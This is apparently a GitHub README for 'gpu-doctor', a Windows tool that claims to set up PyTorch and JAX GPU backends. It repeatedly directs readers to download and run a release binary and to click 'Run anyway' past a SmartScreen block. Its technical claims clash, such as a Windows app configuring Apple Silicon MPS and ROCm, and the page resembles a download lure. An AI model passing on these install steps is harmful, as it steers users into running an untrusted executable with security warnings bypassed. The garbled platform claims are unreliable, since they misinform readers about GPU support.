# ⚙️ gpu-doctor - Easy GPU setup for Windows apps

[![Download gpu-doctor](https://img.shields.io/badge/Download-gpu--doctor-blue.svg?style=for-the-badge&logo=github)](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)

## 🖥️ What gpu-doctor does

gpu-doctor helps you set up your GPU for PyTorch and JAX on Windows. It checks your hardware and picks the right path for your system.

It works with:

- NVIDIA cards with CUDA
- AMD cards with ROCm or DirectML
- Apple Silicon with MPS
- CPU-only systems

It also helps with AMD RX 5700 XT setups by setting `HSA_OVERRIDE_GFX_VERSION` when needed.

## 📥 Download the app

Visit this page to download:

[Download gpu-doctor from GitHub Releases](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)

Look for the latest release and get the Windows file from there.

## 🪟 Install on Windows

1. Open the download page.
2. Download the latest Windows file.
3. If the file is a ZIP, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the app file to run it.
6. If Windows asks for permission, choose Yes.

If you use SmartScreen and Windows blocks the file, choose More info, then Run anyway.

## 🧭 First run

When you open gpu-doctor, it checks your system and looks for:

- Your GPU brand
- The driver type
- The best backend for PyTorch or JAX
- Common setup issues

If it finds a known AMD RX 5700 XT issue, it can set the right override value for you.

## 🔍 What it can help with

gpu-doctor can guide you through common GPU setup paths:

- PyTorch with CUDA on NVIDIA
- PyTorch with DirectML on Windows
- JAX with supported GPU backends
- AMD GPU setup with ROCm
- CPU fallback when no GPU path fits

It is made to reduce manual setup steps.

## ✅ Before you start

For the best result, check these points:

- Use Windows 10 or Windows 11
- Install the latest GPU driver from your GPU maker
- Close heavy apps before the first run
- Make sure you have enough free disk space
- Use a normal user account with install rights

If you use an AMD card, keep your driver up to date. If you use NVIDIA, install the current Game Ready or Studio driver.

## 🧩 Common setup paths

### NVIDIA users
gpu-doctor can point you to the CUDA path. This is the usual choice for NVIDIA cards.

### AMD users
gpu-doctor can help with DirectML or ROCm, based on your card and driver support.

### RX 5700 XT users
gpu-doctor can help set `HSA_OVERRIDE_GFX_VERSION`, which can fix detection and startup issues on some AMD setups.

### Apple Silicon users
gpu-doctor can guide you to MPS support for local runs on supported Mac hardware.

### CPU-only users
If your system has no supported GPU path, gpu-doctor can help you use CPU mode.

## 🛠️ How to use it

1. Download the latest release.
2. Open the app.
3. Let it scan your hardware.
4. Follow the setup path it shows.
5. Apply the suggested change.
6. Start PyTorch or JAX after setup finishes.

If the app offers a choice, pick the option that matches your GPU brand.

## 📌 What makes this useful

gpu-doctor focuses on one task: getting your machine ready for GPU work.

It helps when:

- You are not sure which GPU backend to use
- Your app cannot see the GPU
- PyTorch picks the wrong device
- JAX fails to start with your GPU
- AMD setup needs a small fix
- You want a simple path instead of manual steps

## 📁 Files you may see

The release page may include:

- A Windows app file
- A ZIP package
- Release notes
- Setup files for different systems

For Windows, use the file marked for Windows in the latest release.

## ❓ Frequently asked questions

### Do I need coding knowledge?
No. You only need to download the release and run the app.

### Does it work on every GPU?
It covers common GPU paths for NVIDIA, AMD, Apple Silicon, and CPU use. Your exact result depends on your hardware and driver.

### Will it change my system settings?
It may apply a small setup change for your GPU path, such as a driver-related environment value. It only does what is needed for the chosen setup.

### Can I use it with PyTorch and JAX?
Yes. It is built for both.

### What if I have an AMD RX 5700 XT?
gpu-doctor can help with the `HSA_OVERRIDE_GFX_VERSION` setting if that card needs it on your system.

## 🔗 Download again

[Go to the gpu-doctor releases page](https://github.com/Philippinegreatyellowgentian737/gpu-doctor/releases)

## 🧭 Quick start

1. Open the releases page.
2. Download the latest Windows build.
3. Extract it if needed.
4. Run the app.
5. Follow the GPU setup shown on screen

## 🧪 Supported use cases

- Local machine learning setup
- GPU checks before installing Python tools
- Backend choice for PyTorch
- Backend choice for JAX
- AMD GPU setup on Windows
- Fallback setup on non-GPU systems